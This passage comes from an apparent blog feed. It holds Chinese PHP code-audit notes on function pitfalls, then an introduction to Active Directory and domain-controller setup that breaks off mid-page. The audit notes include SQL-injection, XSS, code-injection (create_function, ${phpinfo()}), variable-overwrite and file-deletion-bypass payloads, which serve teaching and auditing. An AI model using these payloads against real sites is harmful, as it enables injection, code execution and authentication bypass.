class="line">var_dump($name1);       // 1.txt</span><br><span class="line">$mypath2 = &apos;C:\Users\monkey\2.txt&apos;;</span><br><span class="line">$name2 = basename($mypath2);</span><br><span class="line">var_dump($name2);       // C:\Users\monkey\2.txt</span><br></pre></td></tr></table></figure></p><p>注:</p><ol><li>不一定是需要addslashes，只需要是进行了转义即可</li><li>此方式的利用需要在win平台下。因为在win平台下，\/都可以作为basename的分隔符，但是在Linux平台下只有/可以作为分隔符，而addslashes会增加一个\。所以只能在win平台下使用。</li></ol><p>漏洞演示如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$filename = &quot;123&apos;456.png&quot;;</span><br><span class="line">$filename = addslashes($filename);</span><br><span class="line">var_dump($filename);        //结果是 123\&apos;456.png</span><br><span class="line">$filename = basename($filename);</span><br><span class="line">var_dump($filename);        // 结果是 &apos;456.png</span><br></pre></td></tr></table></figure></p><p>通过例子可以看到，成功地逃逸了反斜线，单引号也保留了。<br>如果存在如下的代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// 对输入进行转义</span><br><span class="line">if (!@ get_magic_quotes_gpc()) &#123;</span><br><span class="line">    $_GET = $_GET ? $this-&gt;addslashes_deep($_GET) : &apos;&apos;;</span><br><span class="line">    $_POST = $_POST ? $this-&gt;addslashes_deep($_POST) : &apos;&apos;;</span><br><span class="line">    $_COOKIE = $this-&gt;addslashes_deep($_COOKIE);</span><br><span class="line">    $_REQUEST = $this-&gt;addslashes_deep($_REQUEST);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$imagename = basename($_POST[&apos;image&apos;]);</span><br><span class="line">$sql = &quot;UPDATE table SET image = &apos;&quot;.$imagename.&quot;&apos;where id=1&quot;;</span><br><span class="line">query($sql);</span><br></pre></td></tr></table></figure><p>此时，如果我们输入的image的参数为<code>123&#39; and if(1.sleep(3)，0)#</code>，最后的imagename的值为<code>&#39; and if(1.sleep(3)，0)#</code>，sql语句为<code>UPDATE table SET image = &#39;&#39; or if(1.sleep(3)，0)#&#39;where id=1</code>形成了一个盲注。</p><h4 id="32-explode-amp-amp-preg-replace"><a href="#32-explode-amp-amp-preg-replace" class="headerlink" title="32.explode &amp;&amp; preg_replace"></a>32.explode &amp;&amp; preg_replace</h4><p>注:这种漏洞常见于文件上传</p><p>explode()用法:</p><blockquote><p>array explode ( string $delimiter ， string $string [， int $limit ] )，此函数返回由字符串组成的数组，每个元素都是 string 的一个子串，它们被字符串 delimiter 作为边界点分割出来。</p></blockquote><p>示例:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$pizza  = &quot;piece1 piece2 piece3 piece4 piece5 piece6&quot;;</span><br><span class="line">$pieces = explode(&quot; &quot;， $pizza);         // 得到数组array(&quot;piece1&quot;，&quot;piece2&quot;，&quot;piece3&quot;，&quot;piece4&quot;，&quot;piece5&quot;，&quot;piece6&quot;)</span><br></pre></td></tr></table></figure><p>这两个函数造成的漏洞其实就是一个任意文件上传，由于preg_replace()过滤了特殊字符，导致能够逃逸出php这种后缀，而explode()用以取文件名，最后取得的就是错误的文件后缀。</p><p>29~32的漏洞实例&amp;参考:</p><p><a href="https://blog.spoock.com/2018/03/19/wrong-usage-of-filter-function/" target="_blank" rel="noopener">《连续使用过滤函数造成的安全问题总结》</a></p><h4 id="33-PHP可变变量与变量执行"><a href="#33-PHP可变变量与变量执行" class="headerlink" title="33.PHP可变变量与变量执行"></a>33.PHP可变变量与变量执行</h4><p>在花括号内的代码是可以执行的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//这种写法在php5.4.45以下的版本中都是无法执行的，但是在之后的版本都是可行</span><br><span class="line">&lt;?php</span><br><span class="line">    &quot;$&#123;phpinfo()&#125;&quot;; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>在任何php的版本中都可以执行的方法:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;$&#123; phpinfo()&#125;&quot;; 第一个字符为空格)</span><br><span class="line">&quot;$&#123; phpinfo()&#125;&quot;; 第一个字符为tab</span><br><span class="line">&quot;$&#123;/**/phpinfo()&#125;&quot;; 第一个字符为注释</span><br><span class="line">&quot;$&#123;【回车】phpinfo()&#125;&quot;; 第一个字符为回车</span><br><span class="line">&quot;$&#123;@phpinfo()&#125;&quot;; 第一个字符为@</span><br></pre></td></tr></table></figure><blockquote><p>原理:空格，tab，注释，回车是各种语法分析引擎中常见的分割字符，@是PHP语法的一个特殊的容错符号，所以可变变量内的花括号有这么一个规则，需要判断花括号内的内容是否为真正的代码，条件即是文本的第一个字符串是否为PHP语法解析引擎的分割字符和特殊的语法符号！</p></blockquote><p>参考:</p><p><a href="https://blog.spoock.com/2017/07/18/php-variables-variable/" target="_blank" rel="noopener">《PHP可变变量简介以及安全性问题分析》</a></p><h4 id="34-PHP-String-Offset"><a href="#34-PHP-String-Offset" class="headerlink" title="34.PHP String Offset"></a>34.PHP String Offset</h4><p>关于字符串offset取值特性的一段描述[详见[2]]:</p><blockquote><p>String access and modification by character</p><p>Characters within strings may be accessed and modified by specifying the<br>zero-based offset of the desired character after the string using square array<br>brackets, as in $str[42]. Think of a string as an array of characters for this<br>purpose. The functions substr() and substr_replace() can be used when you want<br>to extract or replace more than 1 character.</p><p>Note: Strings may also be accessed using braces, as in $str{42}, for the same purpose. </p></blockquote><p>说白了就是php中的字符串也可以像数组一样进行取值。比如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$test = &quot;hello world&quot;;</span><br><span class="line">echo $test[0];</span><br><span class="line">//h</span><br></pre></td></tr></table></figure><p>但是它的自动转换问题决定了下面的输出也是h:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//pass被自动转换为0</span><br><span class="line">//如果是1pass就会被自动转换为1</span><br><span class="line">$mystr = &quot;hello world&quot;;</span><br><span class="line">echo $mystr[&quot;pass&quot;];</span><br></pre></td></tr></table></figure><p>漏洞示例:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//下面这段代码是在在phpspy2006中用于判断登录时所使用的代码</span><br><span class="line">$admin[&apos;check&apos;] = &quot;1&quot;;</span><br><span class="line">$admin[&apos;pass&apos;]  = &quot;angel&quot;;</span><br><span class="line">......</span><br><span class="line">if($admin[&apos;check&apos;] == &quot;1&quot;) &#123;</span><br><span class="line">....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样的验证逻辑如果利用上述的特性就很容易地就可以被绕过。$admin没有被初始定义为数组类型，那么当我们用字符串提交时phpsyp.php?admin=1abc时，php会取字符串1xxx的第一位，成功绕过if的条件判断。</p><p>与之类似的还有php4fun中的第五题</p><p>参考:</p><p><a href="https://blog.spoock.com/2017/07/07/php-offset/" target="_blank" rel="noopener">《由php offset特征造成的绕过漏洞》</a></p><h4 id="35-switch"><a href="#35-switch" class="headerlink" title="35.switch"></a>35.switch</h4><p>如果switch是数字类型的case的判断时，switch会将其中的参数转换为int类型。如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$i =&quot;2abc&quot;;</span><br><span class="line">switch ($i) &#123;</span><br><span class="line">case 0:</span><br><span class="line">case 1:</span><br><span class="line">case 2:</span><br><span class="line">    echo &quot;i is less than 3 but not negative&quot;;</span><br><span class="line">    break;</span><br><span class="line">case 3:</span><br><span class="line">    echo &quot;i is 3&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//输出i is less than 3 but not negative</span><br></pre></td></tr></table></figure><h4 id="36-file-put-contents-amp-amp-unlink"><a href="#36-file-put-contents-amp-amp-unlink" class="headerlink" title="36.file_put_contents&amp;&amp;unlink"></a>36.file_put_contents&amp;&amp;unlink</h4><p>此处指代file_put_contents、copy、file_get_contents等读取写入操作与unlink、file_exists等删除判断文件函数之间对于路径处理的差异导致的删除绕过</p><p>示例:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$filename = __DIR__ . &apos;/tmp/&apos; . $user[&apos;name&apos;];</span><br><span class="line">$data = $user[&apos;info&apos;];</span><br><span class="line"></span><br><span class="line">file_put_contents($filename, $data);</span><br><span class="line">if (file_exists($filename)) &#123;</span><br><span class="line">unlink($filename);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>以下援引自P牛:</p><blockquote><p>查看php源码，其实我们能发现，php读取、写入文件，都会调用php_stream_open_wrapper_ex来打开流，而判断文件存在、重命名、删除文件等操作则无需打开文件流。</p><p>我们跟一跟php_stream_open_wrapper_ex就会发现，其实最后会使用tsrm_realpath函数来将filename给标准化成一个绝对路径。而文件删除等操作则不会，这就是二者的区别。</p><p>所以，如果我们传入的是文件名中包含一个不存在的路径，写入的时候因为会处理掉“../”等相对路径，所以不会出错；判断、删除的时候因为不会处理，所以就会出现“No such file or directory”的错误。</p></blockquote><p>因此linux可以通过xxxxx/../test.php、test.php/. windows可以通过test.php:test test.ph&lt;来绕过文件删除</p><p>此外发现还可以使用伪协议php://filter/resource=1.php在file_ge_contents、copy等中读取文件内容，却可以绕过文件删除</p><h4 id="37-浮点数问题"><a href="#37-浮点数问题" class="headerlink" title="37.浮点数问题"></a>37.浮点数问题</h4><p>当小数小于10^-16后，PHP对于小数的判断就出现问题了，PHP7也是如此</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump(1.000000000000000 == 1) &gt;&gt; TRUE</span><br><span class="line"></span><br><span class="line">var_dump(1.0000000000000001 == 1) &gt;&gt; TRUE</span><br></pre></td></tr></table></figure><h4 id="38-filter-var-amp-parse-url-gt-ssrf"><a href="#38-filter-var-amp-parse-url-gt-ssrf" class="headerlink" title="38.filter_var&amp;parse_url=&gt;ssrf"></a>38.filter_var&amp;parse_url=&gt;ssrf</h4><p>参考:</p><p><a href="https://www.anquanke.com/post/id/101058/" target="_blank" rel="noopener">《SSRF技巧之如何绕过filter_var( )》</a></p><h4 id="39-file-get-contents"><a href="#39-file-get-contents" class="headerlink" title="39.file_get_contents"></a>39.file_get_contents</h4><p>通过file_get_contents获取网页内容并返回到客户端有可能造成xss</p><p>例如如下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if(filter_var($argv[1], FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">   // parse URL</span><br><span class="line">   $r = parse_url($argv[1]);</span><br><span class="line">   print_r($r);</span><br><span class="line">   // check if host ends with google.com</span><br><span class="line">   if(preg_match(&apos;/baidu\.com$/&apos;, $r[&apos;host&apos;])) &#123;</span><br><span class="line">      // get page from URL</span><br><span class="line">      $a = file_get_contents($argv[1]);</span><br><span class="line">      echo($a);</span><br><span class="line">   &#125; else &#123;</span><br><span class="line">      echo &quot;Error: Host not allowed&quot;;</span><br><span class="line">   &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">   echo &quot;Error: Invalid URL&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然通过filter_var函数对url的格式进行检查，并且使用正则对url的host进行限定</p><p>但是可以通过<code>data://baidu.com/plain;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pgo=</code> 页面会将<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>返回给客户端，就有可能造成xss</p><h4 id="40-敏感配置项"><a href="#40-敏感配置项" class="headerlink" title="40.敏感配置项"></a>40.敏感配置项</h4><p><strong>1.register_globals</strong></p><p>php版本小于5.4时存在</p><p>当该配置项为ON时，会把用户通过GET、POST提交的参数自动注册成全局变量。当代码中存在有未初始化的变量时，可能会导致变量覆盖的问题</p><p>注:其中参数覆盖的顺序受到配置文件中variables_order的参数影响，默认是EGPCS。按顺序，右边的参数来源会覆盖左边的的参数来源</p><p><strong>2.allow_url_include</strong></p><p>php版本大于5.2默认为off</p><p>当该配置项为ON时，可以通过include、require等函数进行远程文件包含</p><p>类似的还有allow_url_fopen，这个参数配置为on的时候可以使用file_get_contents函数打开url</p><p>allow_url_include和allow_url_fopen当两个配置项都为ON的时候，可以直接使用url进行远程包含，当include为ON，fopen为OFF时，只能通过php伪协议进行包含</p><p><strong>3.magic_quato_gpc</strong></p><p>php版本小于5.4存在</p><p>此配置项为ON的时候会对GET、POST、COOKIE变量中的单引号(‘)、双引号(“)、反斜杠（\）、空字符(NULL)前添加反斜杠进行转义。</p><p>注意：这个配置并不会对SERVER变量里的特殊字符进行转义，因此可能会导致referer、client-ip存在注入等漏洞</p><p><strong>4.magic_quato_runtime</strong></p><p>php版本小于5.4存在</p><p>这个配置和magic_quato_gpc的区别就在于runtime是对从数据库或者文件中取出的数据进行转义，因此只对例如file()、fgets()、fread（）、mysql_fetch_array（）等很多对数据库查询和文件读取的函数产生影响</p><p><strong>5.magic_quato_sybase</strong></p><p>php版本小于5.4存在</p><p>这个配置和magic_quato_gpc 的区别在于，sybase只会转义空字符，把单引号转为双引号，并且这个配置如果为ON会覆盖gpc的配置</p><p><strong>6.open_basedir</strong></p><p>这个配置用来设置限定php程序只能访问哪些目录。在windows下，多个目录用分号（;）分割，linux下用冒号(:)进行分割。注意的是配置的目录需要用斜杠（/）进行封尾，否则就变成了前缀匹配。例如，配置/var/test，那么/var/test和/var/test123都是可以进行访问的，如果指定一个确定的目录就要写成/var/test/</p><p>参考:<a href="https://hacksec.xyz/2018/03/21/Code-audit/" target="_blank" rel="noopener">《PHP代码审计小结》</a></p><h3 id="41-parse-url"><a href="#41-parse-url" class="headerlink" title="41.parse_url"></a>41.parse_url</h3><p> <code>parse_url</code> 函数在解析 url 时存在的bug，通过：<code>////x.php?key=value</code> 的方式可以使其返回False。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> zeroyu@zeros  ~  uname -a</span><br><span class="line">Darwin zeros.local 17.7.0 Darwin Kernel Version 17.7.0: Thu Jun 21 22:53:14 PDT 2018; root:xnu-4570.71.2~1/RELEASE_X86_64 x86_64</span><br><span class="line"> zeroyu@zeros  ~  php -v</span><br><span class="line">PHP 7.1.16 (cli) (built: Mar 31 2018 02:59:59) ( NTS )</span><br><span class="line">Copyright (c) 1997-2018 The PHP Group</span><br><span class="line">Zend Engine v3.1.0, Copyright (c) 1998-2018 Zend Technologies</span><br><span class="line"> zeroyu@zeros  ~  php -a</span><br><span class="line">Interactive shell</span><br><span class="line"></span><br><span class="line">php &gt; var_dump(parse_url(&apos;///x.php?key=value&apos;));</span><br><span class="line">bool(false)</span><br><span class="line">php &gt;</span><br></pre></td></tr></table></figure><p>参考:<a href="https://note.youdao.com/http://mxny.org/post/ctf/2016-11-10" target="_blank" rel="noopener">《跨次元CTF》</a></p><h3 id="42"><a href="#42" class="headerlink" title="42.$"></a>42.$</h3><p>$$key = $value;中key有两个$,这会获取到的数组键名作为变量，数组中的键值就成了变量的值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--<span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value)&#123;  </span><br><span class="line">        $$key = $value;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span>($name == <span class="string">"meizijiu233"</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;--&gt;</span><br></pre></td></tr></table></figure><h3 id="43-extract"><a href="#43-extract" class="headerlink" title="43.extract"></a>43.extract</h3><p>可能存在变量覆盖漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = &quot;Original&quot;;</span><br><span class="line">$my_array = array(&quot;a&quot; =&gt; &quot;Cat&quot;,&quot;b&quot; =&gt; &quot;Dog&quot;, &quot;c&quot; =&gt; &quot;Horse&quot;);</span><br><span class="line">extract($my_array);</span><br><span class="line">echo &quot;$a = $a; $b = $b; $c = $c&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>例如:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"xxx"</span>;</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($gift)) &#123;</span><br><span class="line">    $content = trim($flag);</span><br><span class="line">    <span class="keyword">if</span> ($gift == $content) &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"success"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">"failed"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?flag=&amp;gift=</span><br></pre></td></tr></table></figure><h3 id="44-create-function"><a href="#44-create-function" class="headerlink" title="44.create_function"></a>44.create_function</h3><p>不用创建新函数来达到执行的目的，直接使用如下代码达到RCE</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_function(<span class="string">''</span>, $_GET[<span class="string">'code'</span>]);</span><br></pre></td></tr></table></figure><p>具体场景中的绕过问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 如果可控在第一个参数，需要闭合圆括号和大括号：create_function(&apos;)&#123;&#125;phpinfo();//&apos;, &apos;&apos;);</span><br><span class="line">2. 如果可控在第二个参数，需要闭合大括号：create_function(&apos;&apos;, &apos;&#125;phpinfo();//&apos;);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;1-eregi&quot;&gt;&lt;a href=&quot;#1-eregi&quot; class=&quot;headerlink&quot; title=&quot;1.eregi&quot;&gt;&lt;/a&gt;1.eregi&lt;/h4&gt;&lt;p&gt;此函数可以被%00截断&lt;/p&gt;
&lt;p&gt;比如下面这个例子，可以使用$b=”%001111”&lt;/p&gt;
&lt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>域基础知识解析</title>
    <link href="http://zer0yu.github.io/2018/08/24/AD-base-note/"/>
    <id>http://zer0yu.github.io/2018/08/24/AD-base-note/</id>
    <published>2018-08-24T06:34:12.000Z</published>
    <updated>2018-08-24T06:35:45.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01 基础知识"></a>0x01 基础知识</h3><hr><h4 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h4><p><strong>定义</strong>：具有不同名称的计算机可以具有相同的工作组名称，从而可以利用工作组名称进行快速筛选</p><p><strong>问题</strong>：没有办法统一管理（比如统一安装软件）；没办法集中身份验证（工作组中的计算机相互独立，相互访问时需要输入密码的）</p><p>用户在登录时，计算机为用户构造令牌（sid）以及用户所在工作组的令牌（sid），计算机将依据工作组的sid来判断当前用户的权限</p><p><strong>镜像账户问题</strong>：在winserver访问fileserver的时候，如果两台计算机存在相同的账户和密码，将可以在winserver直接访问fileserver。</p><h4 id="域"><a href="#域" class="headerlink" title="域"></a>域</h4><p><strong>域</strong>：Windows Server的核心单位</p><p>注：</p><p>活动目录和域的关系：</p><p>1.域是逻辑上的服务器以及PC的逻辑分组，在一个域里面的用户都使用公共的安全机制和账户信息。</p><p>2.活动目录将域中的资源组织在一起，存放这些资源的各种信息。</p><p><strong>域控（Domain Controller），DC</strong>：安装了AD的服务器就是域控制器，即有AD的计算机就是DC</p><p><strong>活动目录（Active Directory），AD</strong>：活动目录是Windows Server在网络环境中提供的“资源目录”。活动目录是储存着域中相关资源信息的目录，例如计算机，用户组，数据库，服务器，打印机，用户属性（权限等），就像一个数据库。</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/2229391424.png" alt="image"></p><p><strong>活动目录目录服务（Active Directory Directory Services），ADDS</strong>：<br>“The Active Directory directory service is a distributed database that stores and manages information about network resources, as well as application-specific data from directory-enabled applications. Active Directory allows administrators to organize objects of a network (such as users, computers, and devices) into a hierarchical collection of containers known as the logical structure. The top-level logical container in this hierarchy is the forest. Within a forest are domain containers, and within domains are organizational units.”</p><p>首先大家都知道目录，目录提供了文档内容的概览，可以使我们迅速找到一本书，字典中特定的章节。那么将这个概念应用于网络管理员管理服务器中。假设一个公司中有一千台服务器，管理员想要找到特定的服务器的话,一台一台的登陆，显然是极其低效率的方法。所以目录的理念同样适用在解决这种情况。</p><p>ADDS提供给域管理一个集中管理的机制和架构。假设一个公司中有一千台服务器，管理员想要找到特定的服务器的话,一台一台的登陆，显然是极其低效率的方法。ADDS可以让域管理员对网络中的所有资源进行访问（登陆，读写等操作）我们可以将其理解为单点登录。</p><p>活动目录目录服务提供的功能</p><p>（1）提供单点登录访问服务器、服务器上指定的资源与应用程序。</p><p>（2）多播复制（Replicatiion）／／暂时不关心</p><p>（3）基于属性搜索 eg:基于文件名搜索</p><p>（4）基于分类搜索 eg:基于分类搜索</p><p><strong>信任密钥</strong>：计算机在加入域的时候需要由域用户进行“介绍”，之后计算机和DC之间会建立信任关系–即生成只有两方知道的信任密钥</p><p>注：除域管理员外的域用户，默认可以加入域的计算机数目为10台</p><p><strong>信任丢失</strong>：计算机在被还原卡还原之后，其中保存的信任密钥与DC中的信任密钥不一致导致的问题。</p><p>注：如果域中计算机的SID均为一样的，那么DC将认为这些计算机都是一样的，最终建立的信任密钥只会有最后一台。这种情况，常见于多台计算机使用ghost进行一键还原安装</p><p>统一管理的实现：在DC上可以制定组策略或者用户策略，那么域内所有的计算机都将应用DC制定的策略。</p><p>注：这种会传递的信任关系，容易导致共享内容的泄露，详情参考<a href="http://lonelyrain.me/2017/10/10/%E5%9F%9F%E5%AE%89%E5%85%A8/" target="_blank" rel="noopener">《活动目录以及域安全》</a></p><p><strong>域树（Tree）</strong>：一个域下还可能会有子域，从而构成域树</p><p>注：树是有父和子之分的，父域和子域的名称之间是有沿用关系的；树与树之间是没有这种延用关系的；新域就是一个林，只不过这个林只有一棵树。</p><p><strong>域林（Forest）</strong>：多个域树整体将构成域林</p><p>集中身份验证的实现：</p><p>域用户账号是可以在域中的多台计算机进行登录的。因为域用户的账号密码不能直接在传输，因为不安全，所以就有了Netlogon服务，Netlogon会使用被登录计算机与DC的信任密钥对域用户的账号密码进行加密，之后传递给DC进行解密验证；验证通过之后，DC会将对应账户的sid与账户密码一起加密传输给被登录计算机。</p><p>域用户只要在域中的一台计算机进行了登录，就可以通过此计算机访问同域下的所有计算机。当然，如果DC坏了，就无法进行同域访问了；但是还是可以用缓存过得身份进行登录。</p><p>同一工作组中的计算机A要访问域中的计算机B上的共享资源的时候，牵涉到账号归属问题，即账号归属域还是归属工作组，这个归属问题牵涉到账号的验证问题，因而为了区分必须加上前缀，比如：ASERVER\ZEROYU和WORKGROUP\ZEROYU</p><h3 id="0x02-DNS定位域控制器"><a href="#0x02-DNS定位域控制器" class="headerlink" title="0x02 DNS定位域控制器"></a>0x02 DNS定位域控制器</h3><hr><p>DNS负责将域名解析成IP地址</p><p>内网的DNS则可以定位DC，域会有名称，比如zeros。域会向DNS注册这个名称，即SRV记录。域中的计算机访问SRV来进而访问DC</p><p>通常DNS和DC会安装在同一计算机上，因而此计算的本地连接DNS要指向自身</p><h3 id="0x03-AD的安装"><a href="#0x03-AD的安装" class="headerlink" title="0x03 AD的安装"></a>0x03 AD的安装</h3><hr><h4 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h4><p>VMware Workstation Pro<br>网络工作在NAT模式</p><h4 id="step-1-配置静态IP和名称"><a href="#step-1-配置静态IP和名称" class="headerlink" title="step 1:配置静态IP和名称"></a>step 1:配置静态IP和名称</h4><p>给每台计算机设置静态IP（其实只要DC是静态IP就可以了），这里我们给每台计算机都设置静态IP，为了方便起见，我把计算机的名称也进行了修改。</p><p>Windows 2012 R2 - 名称：DCServer - IP:192.168.11.129</p><p>Windows 7 - 名称：win7 - IP:192.168.11.128</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8A%E5%8D%889.30.19.png" alt></p><p>注：在此处我将DCServer既作为DC又作为DNS，所以DCServer的DNS要指向他自身。显然win7的DNS要指向DC。</p><h4 id="step-2-安装Domain-Controller和DNS服务"><a href="#step-2-安装Domain-Controller和DNS服务" class="headerlink" title="step 2:安装Domain Controller和DNS服务"></a>step 2:安装Domain Controller和DNS服务</h4><p>当登录我们的Windows 2012 R2之后，我们可以看到仪表盘，单击添加角色和功能来安装DC和DNS服务</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8A%E5%8D%889.44.23.png" alt="image"></p><p>注：windows server 2003中可以使用<code>dcpromo</code>来安装DC，但是在2012及以后此命令就被废除了。</p><p>服务器角色之前的几项，一直点下一步就好了。直到选择服务器角色这个栏目中需要选择以下两项。</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8A%E5%8D%889.57.35.png" alt="image"></p><p>之后继续默认点下一步即可，直达最后勾选需要重启就重启选项就好。</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8A%E5%8D%889.59.20.png" alt="image"></p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%883.08.03.png" alt="image"></p><p>因为我们这是此域中的第一台DC，所以在此我们选择“添加新林”</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%883.46.15.png" alt="image"></p><p>此处的域功能级别和林功能级别只是为了保证与域中其它DC的兼容而已，此处不用计较，填写好密码点击下一步就好<br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%883.47.55.png" alt="image"></p><p>因为我们还没有配置好DNS，所以会显示警告，不用管，直接点击下一步，它会自动地为我们配置好DNS<br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%883.51.10.png" alt="image"></p><p>名称默认，继续点击下一步<br><img 